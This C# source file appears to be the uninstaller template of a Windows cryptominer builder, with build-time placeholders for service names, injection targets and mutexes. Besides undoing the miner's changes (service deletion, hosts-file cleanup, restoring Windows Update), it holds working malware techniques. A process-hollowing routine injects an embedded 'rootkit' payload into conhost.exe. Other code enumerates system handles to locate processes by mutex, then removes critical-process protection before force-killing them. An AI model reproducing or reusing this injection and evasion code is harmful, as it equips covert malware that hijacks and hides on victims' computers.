using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Runtime.ExceptionServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Management;
using System.Linq;

public partial class _rUninstaller_
{
    private static void Main()
    {
#if DefRootkit
        try
        {
            Inject(GetTheResource("rootkit_u"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "System32\\conhost.exe"), "");
        }
        catch { }
#endif

        try
        {
            KillProcesses();
        }
        catch { }

#if DefStartup
        try
        {
            Command("cmd", "/c sc delete \"#STARTUPENTRYNAME\" & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#STARTUPENTRYNAME\" /f");

        }
        catch {}
#endif

        Thread.Sleep(3000);
        try
        {
#if DefStartup
            File.Delete(PayloadAdminPath);
            File.Delete(PayloadUserPath);
#endif
            File.Delete(Path.Combine(Path.GetTempPath(), "#WINRINGNAME"));
            File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Temp", "#WINRINGNAME"));
        }
        catch { }

#if DefBlockWebsites
        try
        {
            string hostspath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts");
            List<string> hostscontent = new List<string>(File.ReadAllLines(hostspath));

            string[] domainset = new string[] { $CSDOMAINSET };
            for (int i = hostscontent.Count - 1; i >= 0; i--)
            {
                foreach (string set in domainset)
                {
                    if (hostscontent[i].Contains(set))
                    {
                        hostscontent.RemoveAt(i);
                        break;
                    }
                }
            }
            File.WriteAllLines(hostspath, hostscontent.ToArray());
        }
        catch { }
#endif

#if DefDisableWindowsUpdate
        try
        {
            Command("cmd", "/c reg copy \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc_bkp\" \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc\" /s /f & reg copy \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc_bkp\" \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /s /f & reg copy \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv_bkp\" \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" /s /f & reg copy \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\BITS_bkp\" \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\BITS\" /s /f & reg copy \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc_bkp\" \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc\" /s /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc_bkp\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc_bkp\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv_bkp\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\BITS_bkp\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc_bkp\" /f & sc start UsoSvc & sc start WaaSMedicSvc & sc start wuauserv & sc start bits & sc start dosvc");

        }
        catch {}
#endif
        Environment.Exit(0);
    }

    private static void Command(string _rarg1_, string _rarg2_)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }
        catch { }
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SYSTEM_HANDLE_INFORMATION_EX
    {
        public ulong NumberOfHandles;
        public ulong Reserved;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
    {
        public IntPtr Object;
        public IntPtr UniqueProcessId;
        public IntPtr HandleValue;
        public uint GrantedAccess;
        public ushort CreatorBackTraceIndex;
        public ushort ObjectTypeIndex;
        public uint HandleAttributes;
        public uint Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct OBJECT_NAME_INFORMATION
    {
        public UNICODE_STRING Name;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [Flags]
    private enum PROCESS_ACCESS_FLAGS : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VMOperation = 0x00000008,
        VMRead = 0x00000010,
        VMWrite = 0x00000020,
        DupHandle = 0x00000040,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        Synchronize = 0x00100000
    }

    [DllImport("ntdll.dll")]
    private static extern uint NtQueryObject(IntPtr ObjectHandle, int ObjectInformationClass, IntPtr ObjectInformation, ulong ObjectInformationLength, ref ulong returnLength);

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(PROCESS_ACCESS_FLAGS dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll")]
    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, ulong SystemInformationLength, ref ulong returnLength);

    private const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
    private const int ExtendedSystemHandleInformation = 64;

    private const int ObjectNameInformation = 1;
    private const int DUPLICATE_SAME_ACCESS = 0x2;

    private static IntPtr AllocateBuffer(ulong initialSize, Func<IntPtr, ulong, uint> action)
    {
        ulong size = initialSize;
        IntPtr buffer = Marshal.AllocHGlobal((int)size);

        try
        {
            uint status;
            while ((status = action(buffer, size)) == STATUS_INFO_LENGTH_MISMATCH)
            {
                size *= 2;
                Marshal.FreeHGlobal(buffer);
                buffer = Marshal.AllocHGlobal((int)size);
            }

            if (status != 0)
            {
                Marshal.FreeHGlobal(buffer);
                return IntPtr.Zero;
            }

            return buffer;
        }
        catch
        {
            Marshal.FreeHGlobal(buffer);
            throw;
        }
    }

    private static void KillProcesses()
    {
        string[] processNames = new string[] { $INJECTIONTARGETS };
        List<uint> processIds = new List<uint>();

        foreach (var process in Process.GetProcesses())
        {
            if (Array.IndexOf(processNames, process.ProcessName.ToLowerInvariant() + ".exe") >= 0)
            {
                processIds.Add((uint)process.Id);
            }
        }

        string[] mutexes = new string[] { $MUTEXSET };

        ulong structSize = (ulong)Marshal.SizeOf(typeof(SYSTEM_HANDLE_INFORMATION_EX));
        ulong handleEntrySize = (ulong)Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

        IntPtr handleInfoPtr = AllocateBuffer(structSize, (buf, len) => NtQuerySystemInformation(ExtendedSystemHandleInformation, buf, len, ref len));

        if (handleInfoPtr == IntPtr.Zero) return;

        try
        {
            SYSTEM_HANDLE_INFORMATION_EX handleInfo = (SYSTEM_HANDLE_INFORMATION_EX)Marshal.PtrToStructure(handleInfoPtr, typeof(SYSTEM_HANDLE_INFORMATION_EX));
            IntPtr handleEntryPtr = handleInfoPtr + Marshal.SizeOf(typeof(SYSTEM_HANDLE_INFORMATION_EX));

            for (ulong i = 0; i < handleInfo.NumberOfHandles; i++)
            {
                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(handleEntryPtr, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
                uint processID = (uint)handle.UniqueProcessId.ToInt64();
                if (processIds.Contains(processID))
                {
                    IntPtr processHandle = OpenProcess(PROCESS_ACCESS_FLAGS.DupHandle, false, processID);

                    string handleName = GetHandleName(processHandle, handle.HandleValue);
                    if (!string.IsNullOrWhiteSpace(handleName) && mutexes.Contains(handleName))
                    {
#if DefProcessProtect
                        UnProtect((int)processID);
#endif
                        Command("cmd", string.Format("/c taskkill /f /PID \"{0}\"", processID));
                    }

                    CloseHandle(processHandle);
                }

                handleEntryPtr += (int)handleEntrySize;
            }
        }
        finally
        {
            Marshal.FreeHGlobal(handleInfoPtr);
        }
    }

    private static string GetHandleName(IntPtr sourceProcessHandle, IntPtr sourceHandle)
    {
        IntPtr targetHandle;
        if (!DuplicateHandle(sourceProcessHandle, sourceHandle, GetCurrentProcess(), out targetHandle, 0, false, DUPLICATE_SAME_ACCESS)) return null;

        try
        {
            IntPtr buffer = AllocateBuffer(512, (buf, len) => NtQueryObject(targetHandle, ObjectNameInformation, buf, len, ref len));

            if (buffer == IntPtr.Zero) return null;

            OBJECT_NAME_INFORMATION objectNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(buffer, typeof(OBJECT_NAME_INFORMATION));
            string name = objectNameInfo.Name.Buffer != IntPtr.Zero ? Marshal.PtrToStringUni(objectNameInfo.Name.Buffer) : null;

            Marshal.FreeHGlobal(buffer);
            return name;
        }
        finally
        {
            CloseHandle(targetHandle);
        }
    }

#if DefRootkit
    private static byte[] GetTheResource(string resid)
    {
        var MyResource = new System.Resources.ResourceManager("uninstaller", Assembly.GetExecutingAssembly());
        return (byte[])MyResource.GetObject(resid);
    }

    [DllImport("kernel32.dll")]
    private static extern bool CreateProcess(string lpApplicationName,
                                         string lpCommandLine,
                                         IntPtr lpProcessAttributes,
                                         IntPtr lpThreadAttributes,
                                         bool bInheritHandles,
                                         uint dwCreationFlags,
                                         IntPtr lpEnvironment,
                                         string lpCurrentDirectory,
                                         byte[] lpStartupInfo,
                                         byte[] lpProcessInformation);

    [DllImport("kernel32.dll")]
    private static extern long VirtualAllocEx(long hProcess,
                                              long lpAddress,
                                              long dwSize,
                                              uint flAllocationType,
                                              uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern long WriteProcessMemory(long hProcess,
                                                  long lpBaseAddress,
                                                  byte[] lpBuffer,
                                                  int nSize,
                                                  long written);

    [DllImport("ntdll.dll")]
    private static extern uint ZwUnmapViewOfSection(long ProcessHandle,
                                                    long BaseAddress);

    [DllImport("kernel32.dll")]
    public static extern uint CreateRemoteThread(long hProcess,
                                                IntPtr lpThreadAttributes,
                                                uint dwStackSize,
                                                long lpStartAddress,
                                                long lpParameter,
                                                uint dwCreationFlags,
                                                out IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern bool SetThreadContext(long hThread,
                                                IntPtr lpContext);

    [DllImport("kernel32.dll")]
    private static extern bool GetThreadContext(long hThread,
                                                IntPtr lpContext);

    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(long hThread);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(long handle);


    private static void Inject(byte[] payload, string injectionpath, string arguments)
    {
        try
        {
            int e_lfanew = Marshal.ReadInt32(payload, 0x3c);
            int sizeOfImage = Marshal.ReadInt32(payload, e_lfanew + 0x18 + 0x038);
            int sizeOfHeaders = Marshal.ReadInt32(payload, e_lfanew + 0x18 + 0x03c);
            int entryPoint = Marshal.ReadInt32(payload, e_lfanew + 0x18 + 0x10);

            short numberOfSections = Marshal.ReadInt16(payload, e_lfanew + 0x4 + 0x2);
            short sizeOfOptionalHeader = Marshal.ReadInt16(payload, e_lfanew + 0x4 + 0x10);

            long imageBase = Marshal.ReadInt64(payload, e_lfanew + 0x18 + 0x18);

            byte[] bStartupInfo = new byte[0x68];
            byte[] bProcessInfo = new byte[0x18];

            IntPtr pThreadContext = new IntPtr(16 * ((Marshal.AllocHGlobal(0x4d0 + (16 / 2)).ToInt64() + (16 - 1)) / 16));

            Marshal.WriteInt32(pThreadContext, 0x30, 0x0010001b);

            CreateProcess(null, injectionpath + (!string.IsNullOrEmpty(arguments) ? " " + arguments : ""), IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, Path.GetDirectoryName(injectionpath), bStartupInfo, bProcessInfo);
            long processHandle = Marshal.ReadInt64(bProcessInfo, 0x0);
            long threadHandle = Marshal.ReadInt64(bProcessInfo, 0x8);

            ZwUnmapViewOfSection(processHandle, imageBase);
            VirtualAllocEx(processHandle, imageBase, sizeOfImage, 0x3000, 0x40);
            WriteProcessMemory(processHandle, imageBase, payload, sizeOfHeaders, 0L);

            for (short i = 0; i < numberOfSections; i++)
            {
                byte[] section = new byte[0x28];
                Buffer.BlockCopy(payload, e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i), section, 0, 0x28);

                int virtualAddress = Marshal.ReadInt32(section, 0x00c);
                int sizeOfRawData = Marshal.ReadInt32(section, 0x010);
                int pointerToRawData = Marshal.ReadInt32(section, 0x014);

                byte[] bRawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(payload, pointerToRawData, bRawData, 0, bRawData.Length);

                WriteProcessMemory(processHandle, imageBase + virtualAddress, bRawData, bRawData.Length, 0L);
            }

            GetThreadContext(threadHandle, pThreadContext);

            byte[] bImageBase = BitConverter.GetBytes(imageBase);

            long rdx = Marshal.ReadInt64(pThreadContext, 0x88);
            WriteProcessMemory(processHandle, rdx + 16, bImageBase, 8, 0L);

            Marshal.WriteInt64(pThreadContext, 0x80, imageBase + entryPoint);

            SetThreadContext(threadHandle, pThreadContext);
            ResumeThread(threadHandle);

            Marshal.FreeHGlobal(pThreadContext);
            CloseHandle(processHandle);
            CloseHandle(threadHandle);
            
        }
        catch { }
    }
#endif

#if DefProcessProtect
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    private static void UnProtect(int pid)
    {
        try
        {
            Process.EnterDebugMode();

            int isCritical = 0;
            int BreakOnTermination = 0x1D;
            NtSetInformationProcess(OpenProcess(0x001F0FFF, false, pid), BreakOnTermination, ref isCritical, sizeof(int));
        }
        catch { }
    }
#endif
}